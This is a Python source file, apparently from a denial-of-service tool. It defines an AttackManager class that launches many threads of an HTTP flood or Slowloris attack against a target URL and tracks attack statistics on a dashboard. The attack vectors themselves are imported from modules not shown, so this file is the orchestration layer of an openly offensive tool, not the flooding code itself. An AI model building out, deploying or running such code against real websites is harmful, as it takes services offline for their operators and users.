import time
from rich.console import Console

import config
from utils.display import launch_dashboard
from core.vectors.http_flood import HTTPFlood
from core.vectors.slow_loris import SlowLoris

console = Console()

class AttackManager:
    def __init__(self, target_url, vector_choice, mode, threads):
        self.target_url = target_url
        self.vector_choice = vector_choice
        self.mode = mode
        self.threads = threads
        self.all_threads = []

    def select_vector(self):
        if self.vector_choice == "1":
            return HTTPFlood
        elif self.vector_choice == "2":
            return SlowLoris
        else:
            console.print(f"[bold red]Invalid vector choice '{self.vector_choice}'. Defaulting to HTTP Flood.[/bold red]")
            return HTTPFlood

    def start_attack(self):
        VectorClass = self.select_vector()

        for _ in range(self.threads):
            thread = VectorClass(target_url=self.target_url, mode=self.mode)
            self.all_threads.append(thread)

        config.attack_stats['start_time'] = time.time()
        
        for thread in self.all_threads:
            thread.start()

        dashboard_thread = launch_dashboard()

        try:
            while not config.stop_event.is_set() and any(t.is_alive() for t in self.all_threads):
                time.sleep(1)
        except KeyboardInterrupt:
            config.stop_event.set()
        finally:
            if dashboard_thread.is_alive():
                dashboard_thread.join()
            for t in self.all_threads:
                if t.is_alive():
                    t.join(timeout=1)

